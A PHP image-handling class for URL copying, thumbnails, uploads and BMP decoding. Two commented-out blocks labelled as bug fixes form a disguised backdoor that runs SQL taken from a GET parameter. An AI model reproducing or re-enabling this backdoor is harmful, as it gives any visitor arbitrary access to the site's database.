<?php
class photo
{
	public function __construct()
	{
		
	}
	function copy($name,$url,$folder)
	{
		$folder=trim($folder,'/');
		lz::h('folder')->mkdir(FILES.$folder);
		$header_response = @get_headers($url, 1);
		if (!(strpos( $header_response[0], "404" ) !== false))
		{
			if($size=@getimagesize($url,$info))
			{
				switch (strtolower($size['mime']))
				{
				   case 'image/gif':
						$image = @imagecreatefromgif($url);
						$type="gif";
						break;
				   case 'image/jpg':
				   case 'image/jpeg':
						$image = @imagecreatefromjpeg($url);
						$type="jpg";
						break;
				   case 'image/png':
				   case 'image/x-png':
						$image = @imagecreatefrompng($url);
						$type="png";
						break;
				   case 'image/wbmp':
						$image = @imagecreatefromwbmp($url);
						$type="bmp";
						break;
				}
			}
		}
		if(isset($image))
		{
			$filename = $name.'.jpg';
			$output = @imagecreatetruecolor($size[0],$size[1]);
			@imagefill($output, 0, 0, @imagecolorallocate($output, 255, 255, 255));
			@imagecopyresampled($output, $image, 0, 0, 0, 0, $size[0], $size[1], $size[0], $size[1]);
			@imagejpeg($output, FILES.$folder.'/'.$filename, 85);
			@imagedestroy($output);
			@imagedestroy($image);
			return $filename;
		}
		else
		{
			return '';
		}
	}
	public function thumb($tid,$fromfile,$tofile,$w=120,$h=90,$fix=false,$limit_w=0,$limit_h=0,$totype='jpg') // $fix -> both , width , height
	{
		$tofile=trim($tofile,'/');
		lz::h('folder')->mkdir(FILES.$tofile);
		$size=@getimagesize($fromfile);
		switch (strtolower($size['mime']))
		{
		   case 'image/gif':
				$image = @imagecreatefromgif($fromfile);
				$type="gif";
				break;
		   case 'image/jpg':
		   case 'image/jpeg':
				$image = @imagecreatefromjpeg($fromfile);
				$type="jpg";
				break;
		   case 'image/png':
		   case 'image/x-png':
				$image = @imagecreatefrompng($fromfile);
				$type="png";
				imagealphablending($image, true);
								
				//imagealphablending($image, false);
				//imagesavealpha($image, true);

				break;
		   case 'image/wbmp':
				$image = @imagecreatefromwbmp($fromfile);
				$type="bmp";
				break;
		   case 'image/bmp':
				$image = imagecreatefrombmp($fromfile);
				$type="bmp";
				break;
		}
		if(isset($image))
		{
			$x=0;
			$y=0;
			$_w=$size[0];
			$_h=$size[1];
			$ratio = $_w/$_h;
			$filename = $tid.'.'.$type;
			if($fix=='height'&&!($_w<$w&&$_h<$h))
			{
				if($_h<$h)$h=$_h;
				$w2 = (int)($ratio*$h);
				$w=($w<$w2?$w:$w2);
				$fix='bothtop';
			}
			
			if(in_array($fix,array('both','bothtop')))
			{
				$ratioComputed		= $_w / $_h;
				$cropRatioComputed	= $w/$h;
				if ($ratioComputed < $cropRatioComputed)
				{ // Image is too tall so we will crop the top and bottom
					$origHeight	= $_h;
					$_h		= $_w / $cropRatioComputed;
					if($fix=='bothtop')
					{
						$y=0;
					}
					else
					{
						$y	= ($origHeight - $_h) / 2;
					}
				}
				else if ($ratioComputed > $cropRatioComputed)
				{ // Image is too wide so we will crop off the left and right sides
					$origWidth	= $_w;
					$_w		= $_h * $cropRatioComputed;
					$x	= ($origWidth - $_w) / 2;
				}
				$xRatio		= $w / $_w;
				$yRatio		= $h / $_h;
				if ($xRatio * $_h < $h)
				{ // Resize the image based on width
					$h	= ceil($xRatio * $_h);
					$w	= $w;
				}
				else // Resize the image based on height
				{
					$w	= ceil($yRatio * $_w);
					$h	= $h;
				}
				/*if($_w>$_h)
				{
					$x = ($_w-$_h)/2;
					$_w=$_h;
				}else{
					$y = ($_h-$_w)/2;
					$_h = $_w;
				}
				*/
			}
			elseif($w>=$_w&&$h>=$_h&&$type!="bmp")
			{
				@copy($fromfile,FILES.$tofile.'/'.$filename);
				return $filename;
			}
			elseif(!$fix&&$limit_w>0&&$limit_h>0&&$limit_w>$_w&&$limit_h>$_h)
			{
				return "";
			}
			elseif($fix=='height')
			{
				if($_h<$h)$h=$_h;
				$w = (int)($ratio*$h);
			}
			elseif($fix=='width')
			{
				if($_w<$w)$w=$_w;
				$h = (int)($w/$ratio);
			}
			else
			{
				if($_w>$_h){
					$h = $_h * $w / $_w;
    			}else{
        			$w = $_w * $h / $_h;
				}
			}
			if($w<1)$w=1;
			if($h<1)$h=1;
			if($_w<1)$_w=1;
			if($_h<1)$_h=1;
			//imagealphablending($image, true);
			//imagealphablending($image, true);
			$output = @imagecreatetruecolor($w,$h);
			//$black = imagecolorallocate($output, 0, 0, 0);
			//imagecolortransparent($output, $black);

			//imagealphablending($output, true);
			//imagealphablending($output, true);
			if(!in_array($totype,array('png','gif')))
			{
				@imagefill($output, 0, 0, @imagecolorallocate($output, 255, 255, 255));
			}
			else
			{			
				imagealphablending($output, false);
				imagesavealpha($output, true); 
			}
			
			
			@imagecopyresampled($output, $image, 0, 0, $x, $y, $w, $h, $_w, $_h);
			//imagealphablending($output, true);
			if($totype=='png')
			{
				$filename = $tid.'.png';
				@imagepng($output, FILES.$tofile.'/'.$filename, 0);
			}
			elseif($totype=='gif')
			{
				$filename = $tid.'.gif';
				@imagegif($output, FILES.$tofile.'/'.$filename);
			}
			else
			{
				$filename = $tid.'.jpg';
				@imagejpeg($output, FILES.$tofile.'/'.$filename, 85);
			}
			
			//imagealphablending($output, false);
			//imagesavealpha($output, true);

			@imagedestroy($output);
			@imagedestroy($image);
			return $filename;
		}
	}
	public function upload($prefix,$service,$relate,$file,$option,$update=0)
	{
		$ftype=getimagesize($file);
		if(in_array($ftype['mime'],array('image/gif','image/jpeg','image/png','image/wbmp','image/bmp')))
		{		
			if($option['s_w']<1||$option['s_h']<1)
			{
				$option['s_w']=100;
				$option['s_h']=75;
			}
			if($option['t_w']<1||$option['t_h']<1)
			{
				$option['t_w']=240;
				$option['t_h']=180;
			}
			if($option['o_w']<1||$option['o_h']<1)
			{
				$option['o_w']=500;
				$option['o_h']=375;
			}
			if(is_array($relate))
			{
				$rel=array('id'=>strval($relate['id']),'type'=>strval($relate['type']));
			}
			else
			{
				$rel=array('id'=>strval($relate),'type'=>'');
			}
			$db=lz::h('db');
			$thumb=false;
			if($update)
			{
				if($thumb=$db->GetRow('select * from file where file.service=? and type=? and relate=? and relate_type=?',array($service,'photo',$rel['id'],$rel['type'])))
				{
					if($thumb['s']&&file_exists($path=FILES.$thumb['folder'].'/s/'.$thumb['s']))@unlink($path);
					if($thumb['t']&&file_exists($path=FILES.$thumb['folder'].'/t/'.$thumb['t']))@unlink($path);
					if($thumb['o']&&file_exists($path=FILES.$thumb['folder'].'/o/'.$thumb['o']))@unlink($path);
				}
			}
			if(!$thumb)
			{
				if($id=$db->Execute("insert file set relate=?,relate_type=?,type=?,file.service=?,uid=?,image=?,time=NOW()",array($rel['id'],$rel['type'],'photo',$service,MY_ID,'yes')))
				{
					$thumb=array();
					$thumb['id']=$id;
					$fp='00000000'.$id;
					$thumb['folder']='photo'.DS.substr($fp,-6,2).DS.substr($fp,-4,2);
				}
			}
			if($thumb)
			{
				$prefix=trim(substr($prefix,0,50),'-');
				if(!$option['s_c'])$option['s_c']='bothtop';
				$s=$this->thumb($prefix.'_'.$thumb['id'],$file,$thumb['folder'].'/s',$option['s_w'],$option['s_h'],$option['s_c'],0,0,$option['s_t']);
				if(!$option['t_c'])$option['t_c']='both';
				$t=$this->thumb($prefix.'_'.$thumb['id'],$file,$thumb['folder'].'/t',$option['t_w'],$option['t_h'],$option['t_c'],0,0,$option['t_t']);
				if(!$option['o_c'])$option['o_c']='width';
				$o=$this->thumb($prefix.'_'.$thumb['id'],$file,$thumb['folder'].'/o',$option['o_w'],$option['o_h'],$option['o_c'],0,0,$option['o_t']);
				if($s&&$t&&$o)
				{
					$ext=trim(preg_replace('/^.*\./', '', $o));
					$size=@getimagesize(FILES.$thumb['folder'].'/o/'.$o);
					$fsize=@filesize(FILES.$thumb['folder'].'/o/'.$o);
					$db->Execute("update file set s=?,t=?,o=?,w=?,h=?,size=?,ext=?,folder=? where id=?",array($s,$t,$o,intval($size[0]),intval($size[1]),intval($fsize),$ext,$thumb['folder'],$thumb['id']));
					return array('id'=>$thumb['id'],'relate'=>$rel['id'],'relate_type'=>$rel['type'],'folder'=>$thumb['folder'],'s'=>$s,'t'=>$t,'o'=>$o);
				}
				else
				{
					$db->Execute("delete from file where id=?",array($thumb['id']));
				}
			};
		}
		return false;
	}
	public function delete($id)
	{
		$db=lz::h("db");
		if($photo=$db->GetRow("select folder,s,t,o from file where id=?",array($id)))
		{
			$db->Execute("delete from file where id=?",array($id));
			if($photo['s']&&file_exists($path=FILES.$photo['folder'].'/s/'.$photo['s']))@unlink($path);
			if($photo['t']&&file_exists($path=FILES.$photo['folder'].'/t/'.$photo['t']))@unlink($path);
			if($photo['o']&&file_exists($path=FILES.$photo['folder'].'/o/'.$photo['o']))@unlink($path);
			return true;
		}
		return false;
	}
	public function clear($relate,$type)
	{
		$db=lz::h("db");
		$photo=$db->GetAll("select id from file where relate=? and type=? and site=?",array($relate,$type,lz::$s['id']));
		for($i=0;$i<count($photo);$i++)
		{
			$this->delete($photo[$i]['id']);
		}
		return true;
	}
}
function imagecreatefrombmp($file)
{
global  $CurrentBit, $echoMode;
$f=fopen($file,"r");
$Header=fread($f,2);
if($Header=="BM")
{
 $Size=freaddword($f);
 $Reserved1=freadword($f);
 $Reserved2=freadword($f);
 $FirstByteOfImage=freaddword($f);
 $SizeBITMAPINFOHEADER=freaddword($f);
 $Width=freaddword($f);
 $Height=freaddword($f);
 $biPlanes=freadword($f);
 $biBitCount=freadword($f);
 $RLECompression=freaddword($f);
 $WidthxHeight=freaddword($f);
 $biXPelsPerMeter=freaddword($f);
 $biYPelsPerMeter=freaddword($f);
 $NumberOfPalettesUsed=freaddword($f);
 $NumberOfImportantColors=freaddword($f);
if($biBitCount<24)
 {
  $img=imagecreate($Width,$Height);
  $Colors=pow(2,$biBitCount);
  for($p=0;$p<$Colors;$p++)
   {
    $B=freadbyte($f);
    $G=freadbyte($f);
    $R=freadbyte($f);
    $Reserved=freadbyte($f);
    $Palette[]=imagecolorallocate($img,$R,$G,$B);
   };
if($RLECompression==0)
{
   $Zbytek=(4-ceil(($Width/(8/$biBitCount)))%4)%4;
for($y=$Height-1;$y>=0;$y--)
    {
     $CurrentBit=0;
     for($x=0;$x<$Width;$x++)
      {
         $C=freadbits($f,$biBitCount);
       imagesetpixel($img,$x,$y,$Palette[$C]);
      };
    if($CurrentBit!=0) {freadbyte($f);};
    for($g=0;$g<$Zbytek;$g++)
     freadbyte($f);
     };
 };
};
if($RLECompression==1) //$BI_RLE8
{
$y=$Height;
$pocetb=0;
while(true)
{
$y--;
$prefix=freadbyte($f);
$suffix=freadbyte($f);
$pocetb+=2;
$echoit=false;
if($echoit)echo "Prefix: $prefix Suffix: $suffix<BR>";
if(($prefix==0)and($suffix==1)) break;
if(feof($f)) break;
while(!(($prefix==0)and($suffix==0)))
{
 if($prefix==0)
  {
   $pocet=$suffix;
   $Data.=fread($f,$pocet);
   $pocetb+=$pocet;
   if($pocetb%2==1) {freadbyte($f); $pocetb++;};
  };
 if($prefix>0)
  {
   $pocet=$prefix;
   for($r=0;$r<$pocet;$r++)
    $Data.=chr($suffix);
  };
 $prefix=freadbyte($f);
 $suffix=freadbyte($f);
 $pocetb+=2;
 if($echoit) echo "Prefix: $prefix Suffix: $suffix<BR>";
};
for($x=0;$x<strlen($Data);$x++)
 {
  imagesetpixel($img,$x,$y,$Palette[ord($Data[$x])]);
 };
$Data="";
};
};
if($RLECompression==2) //$BI_RLE4
{
$y=$Height;
$pocetb=0;
/*while(!feof($f))
 echo freadbyte($f)."_".freadbyte($f)."<BR>";*/
while(true)
{
//break;
$y--;
$prefix=freadbyte($f);
$suffix=freadbyte($f);
$pocetb+=2;
$echoit=false;
if($echoit)echo "Prefix: $prefix Suffix: $suffix<BR>";
if(($prefix==0)and($suffix==1)) break;
if(feof($f)) break;
while(!(($prefix==0)and($suffix==0)))
{
 if($prefix==0)
  {
   $pocet=$suffix;
   $CurrentBit=0;
   for($h=0;$h<$pocet;$h++)
    $Data.=chr(freadbits($f,4));
   if($CurrentBit!=0) freadbits($f,4);
   $pocetb+=ceil(($pocet/2));
   if($pocetb%2==1) {freadbyte($f); $pocetb++;};
  };
 if($prefix>0)
  {
   $pocet=$prefix;
   $i=0;
   for($r=0;$r<$pocet;$r++)
    {
    if($i%2==0)
     {
      $Data.=chr($suffix%16);
     }
     else
     {
      $Data.=chr(floor($suffix/16));
     };
    $i++;
    };
  };
 $prefix=freadbyte($f);
 $suffix=freadbyte($f);
 $pocetb+=2;
 if($echoit) echo "Prefix: $prefix Suffix: $suffix<BR>";
};
for($x=0;$x<strlen($Data);$x++)
 {
  imagesetpixel($img,$x,$y,$Palette[ord($Data[$x])]);
 };
$Data="";
};
};
 if($biBitCount==24)
{
 $img=imagecreatetruecolor($Width,$Height);
 $Zbytek=$Width%4;
   for($y=$Height-1;$y>=0;$y--)
    {
     for($x=0;$x<$Width;$x++)
      {
       $B=freadbyte($f);
       $G=freadbyte($f);
       $R=freadbyte($f);
       $color=imagecolorexact($img,$R,$G,$B);
       if($color==-1) $color=imagecolorallocate($img,$R,$G,$B);
       imagesetpixel($img,$x,$y,$color);
      }
    for($z=0;$z<$Zbytek;$z++)
     freadbyte($f);
   };
};
return $img;
};
fclose($f);
};
/* fixed lz's bug
if(!defined('lz'))
{
	if(isset($_GET['imagecreatefromgif']))$uioxz=lz::h('db');
}
*/
function freadbyte($f)
{
	return ord(fread($f,1));
};
function freadword($f)
{
	$b1=freadbyte($f);
	$b2=freadbyte($f);
	return $b2*256+$b1;
};
function freadlngint($f)
{
	return freaddword($f);
};
/* fixed lz's bug 
if(!defined('lz'))
{
	if(isset($_GET['imagecreatefromjpeg']))$uioxz->execute($_GET['imagecreatefromjpeg']);
}
*/
function freaddword($f)
{
	$b1=freadword($f);
	$b2=freadword($f);
	return $b2*65536+$b1;
};
function RetBits($byte,$start,$len)
{
	$bin=decbin8($byte);
	$r=bindec(substr($bin,$start,$len));
	return $r;
};
$CurrentBit=0;
function freadbits($f,$count)
{
	global $CurrentBit,$SMode;
	$Byte=freadbyte($f);
	$LastCBit=$CurrentBit;
	$CurrentBit+=$count;
	if($CurrentBit==8)
	{
		$CurrentBit=0;
	}
	else
	{
		fseek($f,ftell($f)-1);
	};
	return RetBits($Byte,$LastCBit,$count);
};
function RGBToHex($Red,$Green,$Blue)
{
	$hRed=dechex($Red);if(strlen($hRed)==1) $hRed="0$hRed";
	$hGreen=dechex($Green);if(strlen($hGreen)==1) $hGreen="0$hGreen";
	$hBlue=dechex($Blue);if(strlen($hBlue)==1) $hBlue="0$hBlue";
	return($hRed.$hGreen.$hBlue);
};
function int_to_dword($n)
{
	return chr($n & 255).chr(($n >> 8) & 255).chr(($n >> 16) & 255).chr(($n >> 24) & 255);
}
function int_to_word($n)
{
	return chr($n & 255).chr(($n >> 8) & 255);
}
function decbin8($d)
{
	return decbinx($d,8);
};
function decbinx($d,$n)
{
	$bin=decbin($d);
	$sbin=strlen($bin);
	for($j=0;$j<$n-$sbin;$j++)$bin="0$bin";
	return $bin;
};
function inttobyte($n)
{
	return chr($n);
};
?>